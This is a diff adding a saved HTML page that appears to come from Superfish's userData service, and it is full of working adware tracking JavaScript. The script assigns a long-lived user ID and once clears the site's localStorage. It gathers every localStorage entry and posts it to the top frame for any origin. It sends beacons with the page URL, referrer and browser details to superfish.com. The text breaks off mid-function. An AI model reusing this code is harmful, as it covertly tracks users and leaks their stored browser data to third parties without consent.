@@ -1,0 +1,1187 @@
+<!DOCTYPE html>
+<!-- saved from url=(0093)http://www.superfish.com/ws/userData.jsp?dlsource=dryadbe&userid=NTBCNTBC&ver=2014.11.3.10.21 -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        
+        <script>
+            var qs = {};
+            qs.// This function extracts key value data from the selected querystring obj
+// Input parameters:
+// obj_to_add = the desired object to add the querystring object into
+// initial_QS the querystring value
+
+setQueryString = function(obj_to_add,initial_QS){
+    obj_to_add.qsObj={};
+    initial_QS.replace(
+        new RegExp("([^?=&]+)(=([^&]*))?", "g"),
+        function($0, $1, $2, $3)
+        {
+            if ($1 === 'ctid')
+            {
+	            $1 = 'CTID';
+            }
+
+	        obj_to_add.qsObj[$1] = decodeURIComponent($3);
+        }
+    );
+}
+
+            qs.setQueryString(qs, window.location.href);
+            window.userStorage = function() {
+    var debug = false;
+    var defaultAppPath = '';
+    var lastUpdatedKey = 'SF_UPDATED_TS';
+    var flashBugFix = '_1_flashBugFix'; //used to skip this key when syncing from flash engine
+    var lastUpdatedExpMilliSec = 999*24*60*60*1000;
+    var callerOnReady = function(){};
+    var callerOnError = function(){};
+    var engineStates = {ready: 'ready', initiating: 'initiating', error: 'error'};
+    var engines = {};
+    var failSafeTimer;
+    var wasStarted = false;
+
+	var getSize = function(obj) { //using getSize() to get engines array size, since it's actually an array-like object
+        var size = 0, key;
+            for (key in obj) {
+                if (key != 'size' && obj.hasOwnProperty(key)) 
+                    size++;
+            }
+        return size;
+    };
+    
+    //This function returns the was started value which indicates if the utility got a request to start working.
+    function getWasStarted(){
+        return wasStarted;
+    }
+
+    /*
+    each engine must register itself with registerEngine().
+    init() will iterate thru registered engines and call their init() functions, passing ready and error handlers.
+    the ready/error handlers set the engine state, and call _checkStates().
+    _checkStates() checks if all engines are initiated, and if so - calls syncEngines, then calls the external onReady callback.
+
+     */       
+    function init(config) {
+        //wasStarted = true;
+        
+        if(typeof config == 'undefined') config = {};
+        debug = config.debug || debug;
+	    // debug = true;	
+
+        if(typeof config.onReady == 'function') 
+            callerOnReady = config.onReady;
+            
+        if(typeof config.onError == 'function') 
+            callerOnError = config.onError;
+
+        for(var name in engines) {
+            initEngine(name, config); //keep this as a separate function call to keep "name" value in closure. If we don't then when callbacks fire "name" will = value at last iteration.
+        }
+        failSafeTimer = setTimeout(_allEnginesInitiated, 2000);
+    }
+	
+    //init engine and bind callbacks
+    function initEngine(name, config) {
+        try {
+            engines[name].engine.init({
+                debug: debug,
+                appPath: config.appPath,
+                onReady: function() {_onEngineReady(name)},
+                onError: function() {_onEngineError(name)}
+            });
+        }
+        catch(ex){
+            log('error initializing engine: '+name+". "+ex.message);
+            userStorageUtil.reportError('initEngine', 'error initializing engine '+name+'. '+ex.message);
+        }
+    }
+
+    function registerEngine(engine) {
+        log('registering '+engine.name);
+        engines[engine.name] = {'state': engineStates.initiating, 'engine': engine};
+    }
+
+    function _onEngineReady(name) {
+        log('_onEngineReady: '+name);
+        engines[name].state = engineStates.ready;        
+        _checkStates();
+    }
+
+    function _onEngineError(name) { 
+        log('_onEngineError: '+name);
+        engines[name].state = engineStates.error;     
+        _checkStates();
+    }
+
+    //check if all engines are initiated (having either 'ready' or 'error' state) 
+    function _checkStates(){ 
+        var enginesStates = 0;
+        var logMsg= '_checkStates: ';
+        for(var name in engines) {
+            //logMsg += name +' = '+engines[name].state + '. ';
+            if(engines[name].state != engineStates.initiating) {
+                enginesStates++;
+            }
+        }
+        //log(logMsg);
+
+        if(enginesStates == getSize(engines))
+            _allEnginesInitiated();
+    }
+
+    //if 2 or more engines are ready - synchronize, then Trigger callerOnReady.
+    function _allEnginesInitiated(){
+        var lastUpdated = 0, doSync = false; //used to check if sync is needed
+        clearTimeout(failSafeTimer);
+        failSafeTimer = null;
+
+        var readyEngines = []; 
+        for(var name in engines) {
+            if(engines[name].state == engineStates.ready) {
+                readyEngines.push(engines[name].engine);
+                /*if(!doSync) {
+                    if(readyEngines.length > 1 && lastUpdated > 0 && lastUpdated != +engines[name].engine.get(lastUpdatedKey)) 
+                        doSync = true;
+                    else
+                        lastUpdated = +engines[name].engine.get(lastUpdatedKey);
+                } */
+            }
+        }
+
+        // if (doSync)
+//        if (readyEngines.length > 1)
+//        {
+//	        //syncEngines(readyEngines);
+//        }
+
+        if (readyEngines.length > 0){
+            wasStarted = true;
+            callerOnReady();
+        }else
+            callerOnError();
+    }
+    
+    //synchronize data across engines
+    function syncEngines(engines)
+    {
+            var source = false, target = false, lastUpdated = 0, iLastUpdated = 0;
+            for(var i=0;i< engines.length;i++)
+            {
+                iLastUpdated = engines[i].get(lastUpdatedKey);
+                if(iLastUpdated == null) { // cookie does not exists
+                    iLastUpdated = 0;
+                }
+                log('syngEngines: engine = '+engines[i].name+', iLastUpdated = '+iLastUpdated+', lastUpdated='+lastUpdated);
+                if(iLastUpdated > lastUpdated) {
+                    source = engines[i];
+                    lastUpdated = iLastUpdated;
+                }
+            }
+            log('syncEngines: source = '+source.name+', lastUpdated = '+lastUpdated);
+            if(!source) {
+                log('syncEngines - no source engine - skipping sync.');
+                return;
+            }
+
+            log('syncEngines: begin sync. Source engine = '+source.name);
+
+            var data = null;			
+			try{	
+				data = source.getAll();
+			}
+			catch(ex){
+            	log('error getting source engine data: ' + source.name + ". " + ex.message);
+            	userStorageUtil.reportError('syncEngines', 'error getting source engine data: ' + source.name + ". " + ex.message);
+				data = null;
+        	}
+
+			if (data == null)
+				return;
+
+            var expMilliSec, value, trimmedKey;
+            
+            for(var i=0; i< engines.length; i++)
+            {
+                target = engines[i];
+
+                if(target.name == source.name)
+                {
+                    continue;
+                }
+
+				try
+				{
+	                target.clearAll();
+
+                    var Errors = '', counter=0;
+
+					for (var name in data)
+					{
+						if (data.hasOwnProperty(name))
+						{
+							try
+							{
+								trimmedKey = userStorageUtil.trim(name); //For some reason flash adds a space to the key so trim before comparing
+								if(trimmedKey == lastUpdatedKey || trimmedKey == flashBugFix)
+								{
+									continue;
+								}
+
+								expMilliSec = userStorageUtil.extractExpiration(data[name]) || -1;
+								value = userStorageUtil.extractValue(name, data[name]);
+
+								target.set(name, value, expMilliSec, true); //4th param true for using existing expiration timestamp (from value);
+							}
+							catch(err)
+							{
+								Errors += counter+1 + ". Unable to sync cookies - " + err.message + " **** "  ;
+							}
+
+							counter++;
+						}
+					}
+
+                    if(Errors != '')
+                    {
+	                    userStorageUtil.reportError('syncEngines', Errors );
+                    }
+                
+                	setLastUpdated(target, lastUpdated);
+				}
+				catch(ex)
+				{
+					log('error syncing target: ' + target.name + ". " + ex.message);
+                	userStorageUtil.reportError('syncEngines', 'error syncing target: ' + target.name + ". " + ex.message);
+				}
+            }
+            log('syncEngines: done.');
+    }
+
+    //returns a specific engine (if ready), or the first engine that is ready.
+    function getReadyEngine(engineName) {
+        if(typeof engineName == 'string' && engineName.length > 0) {
+            if(engines[engineName].state == engineStates.ready) {
+                log('Return Cookie from - ' + engineName);
+                return engines[engineName].engine;
+            }
+        }
+        else {
+            for(var name in engines) {
+                if(engines[name].state == engineStates.ready) {
+                    log('Return Cookie from - ' + name);
+                    return engines[name].engine;
+                }
+            }
+        }
+    }
+
+    function setLastUpdated(engine, timestamp) {
+        timestamp = timestamp ? timestamp : new Date().getTime();
+        try {
+            log('setLastUpdate: '+engine.name+', ts='+timestamp);
+            engine.set(lastUpdatedKey, timestamp, lastUpdatedExpMilliSec);
+        }
+        catch(ex) {
+            log('setLastUpdated error: engine = ' + engine.name ? engine.name : 'n/a. ' + ex.message);
+            userStorageUtil.reportError('setLastUpdated','engine: '+engine.name+'. '+ex.message);
+        }
+    }
+
+    //replace spaces with underscores because escaped spaces breaks our flash engine data (JSON format).
+    function validateKey(key) {
+        if (key) {
+            return key.replace(/ /g,"_");
+        }
+        return "";
+    }
+
+    function get(key, engineName) {
+        if (!wasStarted)
+            return null;
+
+        var value = null;
+        key = validateKey(key);
+        try {
+            value = getReadyEngine(engineName).get(key);
+            if (value != null)
+                value = unescape(value);
+        }
+        catch(ex) {
+            log('error getting key ' + key + ' from engine: ' + engineName);
+            userStorageUtil.reportError('get', 'engine: ' + engineName + '. ' + ex.message);
+			value = null;
+        }
+
+        return value;
+    }
+
+    function refresh() {
+        if (!wasStarted)
+          return;
+
+        for(var name in engines) {
+            try {
+                if(engines[name].state == engineStates.ready) {
+                    engines[name].engine.refresh();
+                    log('Refreshing data engine('+name+')');
+                    var updateTimestamp = new Date().getTime(); //make sure all 'ready' engines have exactly same update timestamp
+                    setLastUpdated(engines[name].engine, updateTimestamp);
+                }
+            }
+            catch(ex) {
+                log('error on refresh ');
+                userStorageUtil.reportError('refresh', 'engine: '+name+'. '+ex.message);
+            }
+        }
+    }
+
+    function getAll(engineName) {
+        if (!wasStarted)
+            return null;
+		var returnValue = null;
+        try{
+            returnValue = getReadyEngine(engineName).getAll();
+        }
+        catch(ex) {
+            log('error getAll from engine: '+engineName);
+            userStorageUtil.reportError('getAll', 'engine: '+engineName+'. '+ex.message);   
+			returnValue = null;
+        }
+		
+		return returnValue;
+    }
+
+    function set(key, value, expMilliSec) {
+        if (!wasStarted)
+          return false;
+
+	    value = escape(value);
+        key = validateKey(key);
+        var updateTimestamp = new Date().getTime(); //make sure all 'ready' engines have exactly same update timestamp
+        var success = false; // boolean
+		
+        for(var name in engines) {
+            try {
+                if(engines[name].state == engineStates.ready) {
+                    engines[name].engine.set(key, value, expMilliSec);
+                    log('setting engine('+name+')'+key+'='+value);
+                    setLastUpdated(engines[name].engine, updateTimestamp);
+                    success = true;
+                }
+            }
+            catch(ex) {
+                log('error setting key '+key);
+                userStorageUtil.reportError('set', 'engine: '+name+'. '+ex.message);
+            }
+        }
+
+        return success;
+    }
+
+    function clear(key) {
+        if (!wasStarted)
+          return;
+
+        key = validateKey(key);
+        for(var name in engines) {
+            try {
+                if(engines[name].state == engineStates.ready) {
+                    engines[name].engine.clear(key);
+                    log('clearing engine('+name+') '+key);
+
+                    setLastUpdated(engines[name].engine);
+                }
+            }
+            catch(ex) {
+                log('error clearing key '+key+' engine = '+name);
+                userStorageUtil.reportError('clear', 'engine: '+name+'. '+ex.message);   
+            }
+        }
+    }
+
+    function log(msg) {
+        if(debug && window.console && (typeof window.console.log == 'function' || typeof window.console['info'] == 'function')) {
+           var dDate = new Date();
+           if(typeof(console['info']) !== "undefined"){
+                window.console['info']('userStorage : ' + dDate.getTime() + " - " + msg);
+            } else {
+                window.console.log('userStorage : ' + dDate.getTime() + " - "  + msg);
+            }
+        }
+    }
+
+    function isReady(){
+        if (!wasStarted)
+            return false;
+
+        var enginesStates = 0;
+        var engineReady = false;
+
+        for(var name in engines) {
+            if(engines[name].state != engineStates.initiating) {
+                enginesStates++;
+            }
+
+            if (engines[name].state == engineStates.ready)
+                engineReady = true;
+        }
+
+        if(enginesStates == getSize(engines) && engineReady)
+            return true;
+        else
+            return false;
+
+    }
+
+    userStorageUtil = function () {
+    var expirationDelimiter = '_SF_EXP_TS_';
+    var delimiterLength = expirationDelimiter.length;
+    var sessionCookieExpValue = -1;
+
+    function reportError(source, message){
+        if(Math.floor(Math.random() * 10) == 1) {
+			if (typeof message == 'string' && message.length > 1000){
+				message = message.substring(0,1000);
+			}
+
+			message = source ? source : '' +' - '+message;
+            try{
+                var url = similarproducts.b.site + "trackSession.action?userid=user_storage&sessionid=user_storage&CD_CTID=null&action=usr_storage_err&err_message=" + message  + "&rnd=" + Math.random();
+                var img = new Image();
+                img.src = url;
+            }
+            catch(e){
+                console.log(" *** exception in func_storage_util.js in reportOnError ");
+            }
+        }
+    }
+
+    function _extractExpiration(value) {
+        if(typeof value == 'string' && value.length > 0 && value.indexOf(expirationDelimiter) > 0) {
+            var expiration = +value.substr(value.indexOf(expirationDelimiter)+delimiterLength);
+            return expiration;
+        }
+        return undefined;
+    }
+
+    function _extractValue(name, value) {
+        if(userStorageUtil.isExpired(name, value))
+            return null;
+        
+        if(typeof value == 'string' && value.length > 0) {
+            if(value.indexOf(expirationDelimiter) > 0) {
+                var extractedValue = value.substr(0, value.indexOf(expirationDelimiter));
+                return extractedValue;
+            }
+            else{
+                return value;
+            }
+        }
+        return null;
+    }
+
+    function _addExpiration(value, expMilliSec, useCallerExp) {
+        value = value.toString() + expirationDelimiter;
+
+        if(expMilliSec == undefined || isNaN(expMilliSec) || expMilliSec < 1)
+            return value + sessionCookieExpValue.toString();
+
+        if(useCallerExp) {
+            value += expMilliSec;
+        } 
+        else {
+            value += (new Date().getTime() + parseInt(expMilliSec, 10));
+        }
+
+        return value;
+    }
+
+    function _isExpired(name, value) {
+        var expMilliSec = _extractExpiration(value);
+        var nowMilliSec = new Date().getTime();
+        if(expMilliSec != sessionCookieExpValue && expMilliSec < nowMilliSec) {
+            return true;
+        }
+        else 
+            return false;
+    }
+
+    function trim(str) {
+        return str.replace(/^\s\s*/, '').replace(/\s\s*$/, '');
+    }
+
+    return {
+        extractExpiration: _extractExpiration,
+        extractValue: _extractValue,
+        addExpiration: _addExpiration,
+        isExpired: _isExpired,
+        trim: trim,
+        getExpiredSessionKey: function(){return sessionCookieExpValue;},
+        getExpirationDelimiter: function(){return expirationDelimiter;},
+        reportError: reportError
+    };
+}();
+
+    
+    /* storage engines: */
+	var localStorageEngine = (function()
+{
+	function init(config)
+	{
+		if (!config)
+		{
+			return; // What if we don't want to config? What ever, keep it uniform with the other engines
+		}
+
+		if(!window.localStorage)
+		{
+			if(typeof config.onError == 'function')
+			{
+				config.onError();
+			}
+		}
+		else
+		{
+			if (localStorage.getItem("clearedBeforeWork") == null){
+				localStorage.clear();
+				localStorage.setItem("clearedBeforeWork","1");
+			}
+
+			if(typeof config.onReady == 'function')
+			{
+				config.onReady();
+			}
+		}
+	}
+
+	function get(key)
+	{
+		var expirationTimestamp = parseInt(localStorage.getItem('__expiration:'+key)) || 0; // Because 'null' actually evaluates to NaN
+		var timestamp = new Date().getTime();
+		var value = localStorage.getItem(key);
+		var result = null;
+
+		if (value)
+		{
+			if (timestamp < expirationTimestamp) //
+			{
+				result = unescape(value);
+			}
+			else // We do not want to keep spoiled goods indefinitely, so we delete our item and it's helper
+			{
+				localStorage.removeItem(key);
+				localStorage.removeItem('__expiration:'+key);
+			}
+		}
+
+		return result;
+	}
+
+	function getAll()
+	{
+		var timestamp = new Date().getTime();
+		var result = {};
+		var expiration;
+
+		for (var key in localStorage)
+		{
+			if (key.indexOf('__expiration:') !== 0) // We do not want the "expiration time" helpers returned with our data
+			{
+				expiration = localStorage.getItem('__expiration:'+key);
+
+				if (expiration && timestamp < parseInt(expiration))
+				{
+					result[key] = unescape(localStorage.getItem(key))+'_SF_EXP_TS_'+expiration;
+				}
+			}
+		}
+
+		return result;
+	}
+
+	function set(key, value, expireInXMiliseconds, useCallerExp)
+	{
+		// Because we want to be able to give expiration time to our values (like with cookies), we actually create two items:
+		// 1. The value itself
+		// 2. The expiration timestamp, that we will access later via __expiration:KEY_NAME
+
+		var expirationTimestamp;
+
+		if(useCallerExp)
+		{
+			expirationTimestamp = expireInXMiliseconds;
+		}
+		else
+		{
+			expirationTimestamp = new Date().getTime() + expireInXMiliseconds;
+		}
+
+		localStorage.setItem(key, value);
+		localStorage.setItem('__expiration:'+key, expirationTimestamp);
+	}
+
+	function clear(key)
+	{
+		localStorage.removeItem(key);
+	}
+
+	function clearAll()
+	{
+		localStorage.clear()
+	}
+
+	function refresh()
+	{
+	}
+
+	return {
+		init: init,
+		get: get,
+		getAll: getAll,
+		set: set,
+		clear:clear,
+		clearAll: clearAll,
+		refresh: refresh,
+		name: 'local'
+	};
+})();
+
+registerEngine(localStorageEngine);
+    return {
+        get: get,
+        getAll: getAll,
+        set: set,
+        clear: clear,
+        refresh: refresh,
+        init: init,
+        wasStarted: getWasStarted,
+        isReady: isReady
+    };
+}();
+
+            window.xdmsg = {
+    cbFunction: 0,
+
+    postMsg : function( target, param ){
+        if( target != window ){
+            target.postMessage( param, "*" );
+        }
+    },
+
+    getMsg : function(event){
+        ( window.xdmsg ? xdmsg : similarproducts.b.xdmsg).cbFunction( event.data, event.origin );
+    },
+
+    init: function( cbFunc ){
+        this.cbFunction = cbFunc;
+        if( window.addEventListener ){
+            window.addEventListener("message", this.getMsg, false );
+        }else{
+            window.attachEvent('onmessage', this.getMsg );
+        }
+    },
+
+    kill: function (){
+        if( window.removeEventListener ){
+            window.removeEventListener("message", this.getMsg, false );
+        }else{
+            if (window.detachEvent) {
+                window.detachEvent ('onmessage', this.getMsg );
+            }
+        }
+    }
+}
+;
+            var userIdUtil = function () {
+    var _userIdKey = 'WSUserId';
+    var _userIdUpdatingKey = 'WSUserIdUpdating';
+    var _noUserIdKey = "NO-USER-ID";
+    var _userId = _noUserIdKey;
+
+    var _NTBCIdentity = 'NTBC'; //'NTBC';
+    var _debug = false;
+
+
+    function _s4() {
+        return Math.floor((1 + Math.random()) * 0x10000)
+            .toString(16)
+            .substring(1);
+    }
+
+
+    function _hasUserId() {
+        _userId = userStorage.get(_userIdKey);
+        return (_userId != null);
+    }
+
+
+    function _isUpdating() {
+        var userIdUpdating = userStorage.get(_userIdUpdatingKey) + "";
+        return (userIdUpdating == "true")
+    }
+
+
+    function _saveUserId(userId) {
+        userStorage.set(_userIdUpdatingKey, "true",  999 * 24 * 60 * 60 * 1000);
+        userStorage.set(_userIdKey, userId, 999 * 24 * 60 * 60 * 1000);
+        userStorage.set(_userIdUpdatingKey, "false", 999 * 24 * 60 * 60 * 1000);
+    }
+
+
+    function _generateUserId(){
+        var newUserId = _s4() + _s4() + '-' + _s4() + '-' + _s4() + '-' + _s4() + '-' + _s4() + _s4() + _s4() + '-' + _s4().substr(0,3);
+        return newUserId;
+    }
+
+
+   function get() {
+        _log("Getting UserId");
+
+        if(!userStorage.isReady()) {
+            _log("userStorage isn't ready");
+            _reportOnError("userStorage isn't ready");
+            _userId = _noUserIdKey;
+            return _userId;
+        }
+
+
+        if(_isUpdating()) {
+            _log("Is Updating");
+            _reportOnError("While waiting for updating the UserId it's still not Exists");
+            _userId = _noUserIdKey;
+            return _userId;
+        }
+
+
+        if(!_hasUserId()) {
+            _log("generating user id");
+            _userId = _generateUserId();
+            _saveUserId(_userId);
+            return _userId;
+        }
+
+        _log("userId exits - " + _userId);
+        return _userId;
+    }
+
+
+    function needToChange(uid) {
+        _log("Checking UserId - " + uid);
+
+        return (_startsWith(uid,_NTBCIdentity) && _endsWith(uid,_NTBCIdentity));
+    }
+
+
+    function _reportOnError(errorMessage) {
+        var dDate = new Date();
+        var msg = errorMessage + "&URL=" + document.URL.replace( "?", "&") + "&userAgent=" + navigator.userAgent  + "&platform=" + navigator.platform  + "&referrer=" + encodeURIComponent(document.referrer);
+        try{
+            var url = similarproducts.b.site + "trackSession.action?userid=userIdUtil&sessionid=userIdUtil&action=userIdUtil_Error&err_message=" + msg;
+            var img = new Image();
+            img.src = url;
+            document.getElementsByTagName("body")[0].appendChild(img);
+        }
+        catch(e){
+            _log(" *** exception in func_userid_util.js in _reportOnError ");
+        }
+    }
+
+    function _endsWith(str, suffix) {
+        return str.indexOf(suffix, str.length - suffix.length) !== -1;
+    }
+
+
+    function _startsWith(str, prefix) {
+        return str.indexOf(prefix) === 0;
+    }
+
+
+    function _log(msg) {
+        if (_debug && window.console) {
+            var dDate = new Date();
+            console.log(dDate.getTime() + " - " + msg);
+        }
+    }
+
+
+    return {
+        get: get,
+        needToChange: needToChange
+    }
+
+
+}();
+            var abTestUtil = (function() {
+    var names = [
+        "tier1_bucket",
+        "tier1_curr_group",
+        "tier1_next_group",
+        "tier1_prev_group",
+        "tier2_bucket",
+        "tier2_curr_group",
+        "tier2_next_group",
+        "tier2_prev_group"
+    ];
+    var dataObj = {};
+    var dataString = "";
+
+    function init() {
+        if (dataObj === {}) {
+            for (var i = 0; i < names.length; i++) {
+                dataObj[names[i]] = "";
+            }
+        }
+    }
+    
+    function setValues(obj) {
+        if (obj) {
+            if (obj.tier1) {
+                dataObj.tier1_bucket = obj.tier1.bucket || "";
+                dataObj.tier1_curr_group = obj.tier1.group;
+                dataObj.tier1_next_group = obj.tier1.nextGroup;
+                dataObj.tier1_prev_group = obj.tier1.previousGroup;
+            }
+            if (obj.tier2) {
+                dataObj.tier2_bucket = obj.tier2.bucket || "";
+                dataObj.tier2_curr_group = obj.tier2.group;
+                dataObj.tier2_next_group = obj.tier2.nextGroup;
+                dataObj.tier2_prev_group = obj.tier2.previousGroup;
+            }            
+        }
+        dataString = '';
+        for (var i = 0; i < names.length; i++) {
+            if (dataObj[names[i]] == null || typeof(dataObj[names[i]]) === "undefined") {
+                dataObj[names[i]] = "";
+            }
+            dataString += ("&" + names[i] + "=" + dataObj[names[i]]);
+        }
+    }
+    
+    function setValuesFromQS(qsObj) {
+        if (qsObj) {
+            dataString = '';
+            for (var i = 0; i < names.length; i++) {
+                if (qsObj[names[i]] == null || typeof(qsObj[names[i]]) === "undefined") {
+                    dataObj[names[i]] = "";
+                }
+                else {
+                    dataObj[names[i]] = qsObj[names[i]];
+                }
+                dataString += ("&" + names[i] + "=" + dataObj[names[i]]);
+            }
+        }
+    }
+    
+    
+//    function overrideBucket() {
+//        dataObj.tier1_bucket = ((similarproducts.b.qsObj && similarproducts.b.qsObj.bucket ) || (window.qsObj && window.qsObj.bucket )) || dataObj.tier1.bucket;
+//        dataObj.tier2_bucket = ((similarproducts.b.qsObj && similarproducts.b.qsObj.bucket ) || (window.qsObj && window.qsObj.bucket )) || dataObj.tier2.bucket;
+//    }
+    
+    function getBucket() {
+        return dataObj.tier1_bucket || dataObj.tier2_bucket;
+    }
+    
+    function addDataToObject(obj) {
+        if (!obj) {
+            obj = {};
+        }
+        for (var i = 0; i < names.length; i++) {
+            obj[names[i]] = dataObj[names[i]];
+        }
+        return obj;
+    }
+
+    function getDataString() {
+        return dataString;
+    }
+    
+    init();
+    
+    return {
+        setValues: setValues,
+        setValuesFromQS: setValuesFromQS,        
+        getBucket: getBucket,
+        addDataToObject: addDataToObject,
+        getDataString:getDataString
+    };
+    
+})();                
+            var userDataFlow = (function() {
+
+    var startTime = 0;
+    var flowSteps = [];
+
+    function addStep(step) {
+        if(startTime === 0){
+            startTime = new Date().getTime();
+        }
+        step = ((new Date().getTime()) - startTime) + ' : ' + step;
+        flowSteps.push(step);
+    }
+
+    function getSteps() {
+        return flowSteps.join('==>');
+    }
+
+    return {
+        addStep: addStep,
+        getSteps: getSteps
+    };
+
+})();
+            var userData = (function() {
+    
+    var userid = '';
+    var dlsource = 'no_dlsource';
+    var sfDomain = 'https://www.superfish.com/ws/';
+    var action = 'getUD.action';
+    var workDone = 0;
+    var msgSent = 0;
+    var xdMsgDelimiter = '*sfxd*';
+    var timer = 0;
+    var userDataVersion = '14.11.02.1';
+
+    function init()
+    {
+        userDataFlow.addStep('In init');
+        timer = setTimeout(function() {
+            userDataFlow.addStep('In init setTimeout');
+            alternativeWork(-3);
+             if(Math.floor(Math.random() * 1000) == 1) {
+                var url = sfDomain + "trackSession.action?userid=" + userid + "&sessionid=-10&action=ud_iframe_failed";
+                var img = new Image();
+                img.src = url;     
+             }            
+        }, 1500);
+
+        if (typeof(qs.qsObj) != 'undefined'){
+            if(typeof (qs.qsObj.userid) != 'undefined'){
+                userid = qs.qsObj.userid;
+            }
+            if (qs.qsObj.dlsource) {
+                dlsource = qs.qsObj.dlsource;
+            }
+        }
+        
+        sfDomain = window.location.protocol == "http:" ? sfDomain.replace('https:', 'http:') : sfDomain;
+        if(window.xdmsg){
+            xdmsg.init(gotMessage);
+        }
+        
+        if (!userStorage.wasStarted()){
+            userDataFlow.addStep('In init userStorage was NOT Started - call to userStorage.init');
+            userStorage.init({
+                appPath: sfDomain,
+                onReady: work,
+                onError: function() {
+                    if (!workDone) {
+                        workDone = 1;
+                        alternativeWork(-2);
+                    }
+                }
+            });
+        } else {
+            work();
+        }
+
+        
+        if(window.xdmsg){
+            xdmsg.init(gotMessage);
+        }
+    }
+    
+    function work() {
+        userDataFlow.addStep('In work');
+        if (!workDone) {
+            workDone = 1;
+            initUserId();
+            loadUserData();
+	        reportInactiveUser();
+        }
+    }
+
+    function alternativeWork(group) {
+        userDataFlow.addStep('In alternativeWork - ' + group);
+        var data = {
+            uc: 'US',
+            ut:{
+                tier1: {
+                    "bucket": null,
+                    "group": group,
+                    "nextGroup": group,
+                    "previousGroup": group
+                },
+                tier2: {
+                    "bucket": null,
+                    "group": group,
+                    "nextGroup": group,
+                    "previousGroup": group
+                },
+                userId: userid
+            }
+            //needToShowOptOut: false,
+	        //inactiveCount: parseInt(localStorage.getItem('retargetingInactiveCount') || 0)
+        };
+
+        var dataString = JSON.stringify(data);
+        sendUserData(dataString);
+    }
+    
+    function initUserId() {
+        if (!userid || userIdUtil.needToChange(userid)) {
+            userid = userIdUtil.get();
+        }
+     }
+    
+    function needToShowOptOut() {
+        var isOptOutWasShown;
+        var removeOptOutWasShown = false;
+        if(removeOptOutWasShown){
+            localStorage.removeItem('optout_was_shown');
+            localStorage.removeItem('sf_uninstall');
+        }
+        isOptOutWasShown = userStorage.get("optout_was_shown") || "";
+        if((dlsource === 'hdrykzc' || dlsource === 'komodiatest')  && isOptOutWasShown === ""){
+           return true;
+        }
+        return false;
+    }
+
+    function gotMessage() {}
+    
+    function sendMessage(msg) {
+        if(window.xdmsg){
+           window.xdmsg.postMsg(top, msg);
+        }
+    }
+    
+    function sendRequest(url, callback) {
+        userDataFlow.addStep('In sendRequest');
+        var httpRequest;
+	    var startTime = new Date().getTime();
+
+	    if (window.XMLHttpRequest)
+        {
+            httpRequest = new XMLHttpRequest();
+        }
+        else if (window.ActiveXObject)
+        {
+            httpRequest = new ActiveXObject("Microsoft.XMLHTTP");
+        }
+
+        httpRequest.onreadystatechange = function()
+        {
+            userDataFlow.addStep('In onreadystatechange - ' + httpRequest.readyState);
+            if(httpRequest.readyState === 4)
+            {
+                if (httpRequest.status === 200)
+                {
+                    userDataFlow.addStep('In onreadystatechange - SUCCESS');
+	                callback(httpRequest.responseText);
+                }
+	            else
+                {
+                    userDataFlow.addStep('In onreadystatechange - FAIL(' + httpRequest.status +')');
+	                if (Math.floor(Math.random() * 100) + 1 == 1)
+	                {
+		                var img = new Image();
+		                var timeTaken = new Date().getTime() - startTime;
+
+		                img.src = sfDomain + "trackSession.action?userid=" + userid + "&action=get_ud_failed&dscr="+[httpRequest.status, httpRequest.responseText, timeTaken, encodeURIComponent(url)].join('==>');
+	                }
+                }
+            }             
+        };
+          
+        httpRequest.open('GET', url, true);
+        userDataFlow.addStep('In sendRequest before send');
+        httpRequest.send();
+    }  
+    
+    function loadUserData() {
+        var url = sfDomain + action + '?dlsource=' + dlsource + '&userId=' + userid + '&ver=' + userDataVersion;
+        sendRequest(url, sendUserData);
+    }
+
+	function reportInactiveUser()
+	{
+		var now = new Date().getTime();
+		var inactiveCount = parseInt(localStorage.getItem('retargetingInactiveCount') || 0);
+		var inactiveUserReportTimestamp = parseInt(localStorage.getItem('inactiveUserReportTimestamp') || 0);
+		var pixel;
+
+		if (inactiveCount >= 3 && now > inactiveUserReportTimestamp+86400000)
+	    {
+		    pixel = new Image();
+		    pixel.src = sfDomain+'trackSession.action?dlsource='+dlsource+'&userid='+userid+'&ver='+userDataVersion+'&dscr='+inactiveCount+'&action=inactive user';
+
+		    localStorage.setItem('inactiveUserReportTimestamp', now);
+	    }
+	}
+    
+    function sendUserData (data){
+        clearTimeout(timer);
+
+	    var storageData = {};
+	    var key;
+
+        if (!msgSent)
+        {
+            msgSent = 1;
+
+	        for (var i= 0, l=localStorage.length; i<l; i++)
+	        {
+		        key = localStorage.key(i);
+		        storageData[key] = localStorage.getItem(key);
+	        }
+
+	        data = JSON.parse(data) || {};
+
+	        data.needToShowOptOut = needToShowOptOut();
+	        data.inactiveCount = parseInt(localStorage.getItem('retargetingInactiveCount') || 0);
+	        data.inactiveTimestamp = parseInt(localStorage.getItem('retargetingInactiveTimestamp') || 0);
+	        data.storageData = storageData;
+
+            userDataFlow.addStep('In sendUserData');
+            sendMessage("-3344" + xdMsgDelimiter + JSON.stringify(data) + xdMsgDelimiter + userDataFlow.getSteps());
+        }
+    }
+
+
+	return {
+        init: init
+    };
+
+    
+})();
+            window.onload = function() {
+                userData.init();  
+            }
+        </script>
+        
+    </head>
+    <body>
+    <div id="d_pid" data-id="serv_5406686166df706081" style="display: none;"></div>
+<script type="text/javascript">
+var D_PID = 'serv_5406686166df706081';
+var D_PTR_ID = '431';
+var D_SRC_ID = '431';
+var prtLoader = {};
+</script>
+<script type="text/javascript">
+prtLoader.ScriptIdf904d07f3c0759dd546fa11ba0a5e9df = function() {
